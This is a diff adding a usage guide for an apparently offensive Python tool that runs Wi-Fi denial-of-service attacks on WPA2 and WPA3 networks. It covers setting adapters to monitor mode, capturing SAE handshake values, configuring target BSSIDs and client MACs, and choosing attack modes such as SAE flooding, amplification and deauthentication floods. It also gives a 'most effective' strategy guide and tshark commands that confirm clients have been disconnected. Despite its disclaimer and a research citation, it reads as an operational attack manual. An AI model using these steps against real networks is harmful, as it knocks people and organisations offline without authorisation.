@@ -1,0 +1,338 @@
+# USAGE GUIDE: orchestator_final_mit_allen_details_en.py
+
+**DISCLAIMER:** This script is intended for EDUCATIONAL PURPOSES ONLY and for authorized security testing on networks you own or have explicit permission to test. Unauthorized use is illegal.
+
+## OVERVIEW
+This script performs advanced Wi-Fi DoS attacks targeting both WPA2 and WPA3 networks using multiple attack vectors including SAE-based attacks, amplification, and deauthentication floods.
+
+---
+
+## PREREQUISITES
+
+### Required Hardware
+- Multiple Wi-Fi adapters capable of monitor mode and packet injection
+- At least one adapter for scanning (optional but recommended)
+- Additional adapters for attack execution
+
+### Required Software
+- Linux operating system (Kali Linux recommended)
+- Python 3.x
+- Scapy library: `pip3 install scapy`
+- Aircrack-ng suite: `apt-get install aircrack-ng`
+- Wireshark (for extracting SAE parameters): `apt-get install wireshark`
+
+---
+
+## STEP-BY-STEP USAGE INSTRUCTIONS
+
+### STEP 1: SET YOUR ADAPTERS TO MONITOR MODE
+
+For each Wi-Fi adapter you plan to use, enable monitor mode:
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airmon-ng start wlan1
+sudo airmon-ng start wlan2
+# Repeat for all adapters you want to use
+```
+
+This will create monitor mode interfaces like `wlan0mon`, `wlan1mon`, `wlan2mon`, etc.
+
+**Verify monitor mode:**
+```bash
+iwconfig
+```
+
+You should see your interfaces listed as "Mode:Monitor"
+
+---
+
+### STEP 2: SCAN THE NETWORK FOR TARGETS
+
+If you're using a scanner interface, you can let the script auto-detect channels. If not, you need to manually find the target channels first.
+
+**Manual Channel Discovery:**
+```bash
+sudo airodump-ng wlan0mon --band abg
+```
+
+- Look for your target network's BSSID (MAC address)
+- Note the channel number for both 5 GHz and 2.4 GHz bands
+- Press `Ctrl+C` to stop scanning
+
+---
+
+### STEP 3: EXTRACT SAE PARAMETERS (CRITICAL FOR WPA3 ATTACKS)
+
+This step is **mandatory** for WPA3 attacks. You need to capture the SAE handshake from a legitimate device.
+
+#### 3.1: Start Wireshark Capture
+```bash
+sudo wireshark
+```
+
+- Select your monitor interface (e.g., `wlan0mon`)
+- Start capturing
+
+#### 3.2: Trigger a WPA3 Handshake
+- Connect a device (smartphone, laptop) to the target WPA3 network
+- **IMPORTANT:** Use the WRONG password! This ensures the SAE Commit frame is sent
+- The device will attempt authentication and fail
+
+#### 3.3: Filter for SAE Packets in Wireshark
+In the display filter bar, enter:
+```
+wlan.fc.type_subtype == 0x0b
+```
+
+#### 3.4: Locate the Authentication Frame
+- Look for "Authentication" frames in the packet list
+- Click on a frame to expand it in the middle pane
+
+#### 3.5: Extract Scalar and Finite Element
+Navigate in the Packet Details pane:
+```
+IEEE 802.11 wireless LAN
+  └─ Tagged Parameters
+      └─ Tag: SAE
+          ├─ Scalar
+          └─ Finite Field Element
+```
+
+**For Scalar:**
+- Right-click on "Scalar"
+- Select "Copy" → "Value"
+- This gives you a hex string like: `49f7dcc4fb5725917c2ba1412ff42123...`
+
+**For Finite Field Element:**
+- Right-click on "Finite Field Element"
+- Select "Copy" → "Value"
+- This gives you a hex string like: `8632644e22320b3b9943f62e52df25de...`
+
+---
+
+### STEP 4: CONFIGURE THE SCRIPT
+
+Open the script in a text editor:
+```bash
+nano orchestator_final_mit_allen_details_en.py
+```
+
+#### 4.1: Set Target BSSIDs
+```python
+TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"      # Your target's 5 GHz BSSID
+TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"    # Your target's 2.4 GHz BSSID
+```
+
+#### 4.2: Configure Scanner (Optional)
+```python
+SCANNER_INTERFACE = "wlan0mon"  # Set to "" to disable scanning
+```
+
+#### 4.3: Set Manual Channels (Required if no scanner)
+```python
+MANUELLER_KANAL_5GHZ = "36"     # Channel for 5 GHz band
+MANUELLER_KANAL_2_4GHZ = "1"    # Channel for 2.4 GHz band
+```
+
+#### 4.4: Define Target Clients (For targeted attacks)
+```python
+TARGET_STA_MACS = [
+    "30:34:DB:11:48:09",  # Client MAC addresses
+    "06:B2:AA:AC:5D:31"
+]
+```
+
+#### 4.5: Configure Amplification Reflectors (If using amplification attack)
+```python
+AMPLIFICATION_REFLECTOR_APS_5GHZ = [
+    "E0:28:6D:E4:D1:86",
+    "8A:67:72:81:9C:68",
+    "64:67:72:81:9C:6E"  # Include your main target
+]
+
+AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
+    "70:54:25:5B:AE:E7",
+    "F8:D2:AC:D6:79:38",
+    "64:67:72:81:9C:6D"  # Include your main target
+]
+```
+
+#### 4.6: **PASTE YOUR SAE PARAMETERS**
+```python
+SAE_SCALAR_HEX = '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
+SAE_FINITE_ELEMENT_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'
+```
+
+Replace these values with the ones you extracted from Wireshark!
+
+#### 4.7: Configure Attack Adapters
+```python
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "amplification"},
+    "wlan2mon": {"band": "5GHz", "angriff": "double_decker"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "open_auth"},
+    "wlan4mon": {"band": "2.4GHz", "angriff": "amplification"}
+}
+```
+
+**Available Attack Types:**
+- `omnivore`: Random MAC flooding (WPA3)
+- `muted`: Single MAC flooding (WPA3)
+- `hasty`: Commit+Confirm confusion (WPA3)
+- `double_decker`: Combined omnivore+muted (WPA3)
+- `open_auth`: Legacy auth flood (Universal, best on 5 GHz)
+- `amplification`: Spoofed response amplification (Universal, best on 2.4 GHz)
+- `back_to_the_future`: WPA3 packets to WPA2 AP (WPA2 targets)
+- `deauth_flood`: Classic deauth attack
+
+---
+
+### STEP 5: RUN THE SCRIPT
+
+Start the attack:
+```bash
+sudo python3 orchestator_final_mit_allen_details_en.py
+```
+
+**What happens:**
+1. Script initializes all configured adapters
+2. Scanner (if enabled) searches for target channels
+3. Attack processes start on each adapter
+4. Real-time packet counter displays progress
+
+**To stop:**
+Press `Ctrl+C` to terminate all processes gracefully.
+
+---
+
+## VERIFYING ATTACK SUCCESS
+
+### Method 1: Beacon Jitter Analysis (AP Overload)
+
+Open a new terminal and monitor beacon timing:
+
+```bash
+sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == 64:67:72:81:9C:6E" -T fields -e frame.time_delta_displayed
+```
+
+**Success indicators:**
+- Normal beacon interval: ~0.1024 seconds
+- Under attack: Values >> 0.1024 (e.g., 0.5, 1.2, 2.0)
+- The larger the deviation, the more CPU/memory stressed
+
+### Method 2: Client Disconnection
+
+Monitor deauthentication frames:
+
+```bash
+sudo tshark -i wlan0mon -Y "wlan.addr == 30:34:DB:11:48:09 && wlan.fc.type_subtype == 0x0c"
+```
+
+**Success indicators:**
+- Continuous stream of deauth frames
+- Client disappears from network
+- Client unable to reconnect
+
+---
+
+## ATTACK STRATEGY GUIDE
+
+### For WPA3 Routers:
+**Most Effective Combination:**
+- 2-3 adapters on 5 GHz: `double_decker` or `omnivore`
+- 2-3 adapters on 2.4 GHz: `amplification`
+- 1 adapter: `open_auth` (5 GHz)
+
+### For WPA2 Routers:
+**Most Effective Combination:**
+- Multiple adapters: `open_auth` (5 GHz band)
+- Multiple adapters: `amplification` (2.4 GHz band)
+- 1 adapter: `back_to_the_future`
+
+### Mixed Attack Philosophy:
+Combining different attack types creates a "symphony of chaos":
+- CPU overload: `open_auth`, `hasty`
+- Memory exhaustion: `omnivore`, `double_decker`
+- Channel saturation: `amplification`
+- Bypasses single-vector defenses
+
+---
+
+## TROUBLESHOOTING
+
+### "Channel switch failed"
+- Verify adapter supports the target frequency band
+- Check if adapter is properly in monitor mode: `iwconfig`
+
+### "No targets found in scan"
+- Increase scan time in code (modify loop range)
+- Verify target BSSID is correct
+- Ensure target is broadcasting
+
+### "Process paused" messages
+- `amplification`: Need at least 2 reflector APs configured
+- `deauth_flood`: Need target client MACs configured
+- Check your configuration arrays
+
+### Script exits immediately
+- Ensure running with `sudo`
+- Verify Python 3 and Scapy are installed
+- Check that all configured interfaces exist
+
+---
+
+## IMPORTANT NOTES
+
+1. **SAE Parameters are Network-Specific:** You must extract new parameters for each target network
+2. **Wrong Password Required:** When capturing SAE handshake, use an incorrect password
+3. **Adapter Compatibility:** Not all adapters support all channels (some are 2.4 GHz only)
+4. **Legal Warning:** Only test on networks you own or have written authorization to test
+5. **Channel Hopping:** Disable before running script: `sudo airmon-ng check kill`
+
+---
+
+## EXAMPLE CONFIGURATION
+
+Complete working example for a dual-band attack:
+
+```python
+TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:F1"
+TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:F0"
+
+SCANNER_INTERFACE = "wlan0mon"
+
+MANUELLER_KANAL_5GHZ = "36"
+MANUELLER_KANAL_2_4GHZ = "6"
+
+TARGET_STA_MACS = ["11:22:33:44:55:66"]
+
+AMPLIFICATION_REFLECTOR_APS_5GHZ = [
+    "AA:BB:CC:DD:EE:F1",
+    "FF:EE:DD:CC:BB:AA"
+]
+
+AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [
+    "AA:BB:CC:DD:EE:F0",
+    "00:11:22:33:44:55"
+]
+
+SAE_SCALAR_HEX = 'YOUR_EXTRACTED_SCALAR_HERE'
+SAE_FINITE_ELEMENT_HEX = 'YOUR_EXTRACTED_FINITE_ELEMENT_HERE'
+
+ADAPTER_KONFIGURATION = {
+    "wlan1mon": {"band": "5GHz", "angriff": "double_decker"},
+    "wlan2mon": {"band": "5GHz", "angriff": "open_auth"},
+    "wlan3mon": {"band": "2.4GHz", "angriff": "amplification"}
+}
+```
+
+Then run: `sudo python3 orchestator_final_mit_allen_details_en.py`
+
+---
+
+## REFERENCES
+
+Based on research: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
+Journal of Information Security and Applications (2022)
